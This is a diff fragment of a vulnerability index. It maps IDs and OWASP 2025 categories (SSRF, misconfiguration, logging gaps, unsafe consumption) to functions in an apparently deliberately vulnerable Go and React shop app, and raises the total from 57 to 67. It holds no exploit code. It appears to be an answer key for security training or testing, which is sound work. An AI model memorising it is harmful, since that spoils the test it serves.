+| A08:2025-B4 | A08:2025 Exceptional Conditions | upload.go:processImage()       | Medium   |
+| A08-B1      | A05:2025 Misconfig              | upload.go:Upload()             | High     |
+| A08-B2      | A05:2025 Misconfig              | upload.go:Upload()             | Medium   |
+| A08-B3      | A10:2025 Unsafe Consumption     | cart.go:GetCart()              | High     |
+| A08-B4      | A10:2025 Unsafe Consumption     | import.go:ImportFromURL()      | Medium   |
+| A08-F1      | A06:2025 Supply Chain           | index.html                     | Medium   |
+| A08-F2      | A10:2025 Unsafe Consumption     | CartContext.tsx                | Medium   |
+| A10:2025-B1 | A10:2025 Unsafe Consumption     | files.go:View()                | Critical |
+| A10:2025-B2 | A10:2025 Unsafe Consumption     | auth.go:Login() + Login.tsx    | High     |
+| A10:2025-B3 | A10:2025 Unsafe Consumption     | auth.go:UpdateProfile()        | Critical |
+| A10:2025-B4 | A10:2025 Unsafe Consumption     | settings.go:Update() + auth.go | Critical |
+| A09-B1      | A09:2025 Logging                | auth.go multiple methods       | High     |
+| A09-B2      | A09:2025 Logging                | admin.go (absence)             | Medium   |
+| A09-B3      | A09:2025 Logging                | Entire app (absence)           | Medium   |
+| A09-F1      | A09:2025 Logging                | api/client.ts                  | Medium   |
+| A09-F2      | A09:2025 Logging                | Checkout.tsx                   | High     |
+| A10-B1      | A01:2025 Access Control (SSRF)  | import.go:ImportFromURL()      | Critical |
+| A10-B2      | A01:2025 Access Control (SSRF)  | products.go:ImageProxy()       | Critical |
+| A10-B3      | A01:2025 Access Control (SSRF)  | admin.go:WebhookCallback()     | Critical |
 
-**Total vulnerabilities**: 57
+**Total vulnerabilities**: 67
